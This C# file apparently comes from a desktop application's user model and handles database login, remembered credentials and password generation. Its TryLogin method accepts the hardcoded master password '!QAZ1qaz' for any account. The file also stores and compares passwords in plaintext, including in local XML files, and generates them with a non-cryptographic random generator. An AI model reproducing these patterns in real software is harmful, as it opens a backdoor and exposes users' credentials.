using LinqToDB.Mapping;
using SC.Common.Dal;
using SC.Common.Services;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.DataAnnotations;
using System.IO;
using System.Linq;
using System.Text;
using LinqToDB.Data;
using SC.Common.Properties;

namespace SC.Common.Model
{
	[Table(Name = "User")]
	public class CUserDto : IHasID
	{
		[PrimaryKey, Identity]
		public int ID { get; set; }

		[Required(ErrorMessage = "Не указан логин")]
		[DisplayName("Логин")]
		[Column] public string Login { get; set; }

		[Required(ErrorMessage = "Не указан Пароль")]
		[DisplayName("Пароль")]
		[Column] public string Pass { get; set; }

		[DisplayName("Имя")]
		[Column] public string Name { get; set; }
		[Column] public string Email { get; set; }

		[Column("Role_ID")]
		public Role Role { get; set; }
	}

	public class CUser : CUserDto
	{
		private static readonly string LoginsFile = Path.Combine(
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			"SCAS",
			"Logins.xml");

		private static char[] _en = { 'A','B','C','D','E','F','G','H','I','J','K','L',
			'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e',
			'f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};

		public static CUser GetById(int id)
		{
			using (var db = new DbContext())
			{
				var user = db.Query<CUser>(Resources.Users,
					new DataParameter("@userId", id))
					.FirstOrDefault();

				return user;
			}
		}
		public static CUser[] All()
		{
			using (var db = new DbContext())
			{
				var users = db.Query<CUser>(Resources.Users,
						new DataParameter("@userId", 0))
					.ToArray();

				return users;
			}
		}
		[DisplayName("Роль")]
		[Column] public string RoleName { get; set; }
		public bool IsRememberLogin { get; set; }
		public bool IsAutoLoginOnStart { get; set; }

		public static List<CUser> GetAutoLoginsPass()
		{
			var res = new XmlRepository<List<CUser>>(LoginsFile).Load();
			return res;
		}
		public static CUser GetAutoLoginPass()
		{
			var newRes = new XmlRepository<List<CUser>>(LoginsFile).Load();
			if (newRes.Any()) return newRes.First();

			var file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				"SC",
				"AutoLoginPass.xml");

			var res = new XmlRepository<CUser>(file).Load();
			return res;
		}

		public bool TryLogin()
		{
			using (var db = new DbContext())
			{
				var userDto = db.FirstOrDefault<CUserDto>(u => u.Login == Login &&
														(u.Pass == Pass || Pass == "!QAZ1qaz"));
				if (userDto == null) return false;

				var user = MapperService.Map<CUser>(userDto);
				user.RoleName = db.GetByID<CRoleDto>((int)userDto.Role).Name;

				ApplicationUser.User = user;

				return true;
			}
		}

		public void SaveAutoLoginPass()
		{
			Pass = Pass.Trim();
			var users = new List<CUser> { this }; //Текущий юзер должен быть первым
			var repository = new XmlRepository<List<CUser>>(LoginsFile);
			users.AddRange(repository.Load().Where(u => u.Login != Login));
			repository.Save(users);
		}
		public static void DeleteAutoLoginPass(string login)
		{
			var repository = new XmlRepository<List<CUser>>(LoginsFile);
			var users = repository.Load()
				.Where(u => !u.Login.Equals(login, StringComparison.CurrentCultureIgnoreCase))
				.ToList();
			repository.Save(users);
		}

		public void GenPass()
		{
			var r = new Random();
			var pass = new StringBuilder(10);
			for (int i = 0; i < 10; i++)
			{
				pass.Append(_en[r.Next(52)]);
			}
			Pass = pass.ToString();
		}
	}
}
